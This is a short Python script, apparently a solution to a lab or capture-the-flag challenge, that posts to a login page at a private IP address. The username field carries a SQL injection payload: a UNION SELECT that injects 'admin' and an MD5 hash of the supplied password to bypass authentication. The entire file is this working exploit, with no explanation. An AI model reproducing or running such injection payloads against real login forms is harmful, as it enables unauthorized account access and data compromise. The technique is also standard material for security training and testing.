import requests
import hashlib

url = 'http://192.168.80.128:8858/login.php'

data = {
    'username':"123' union select 'admin', '{}'#".format(hashlib.md5(b'whistle').hexdigest()),
    'password':"whistle"
}

r = requests.post(
    url = url,
    data = data
)

print(r.text)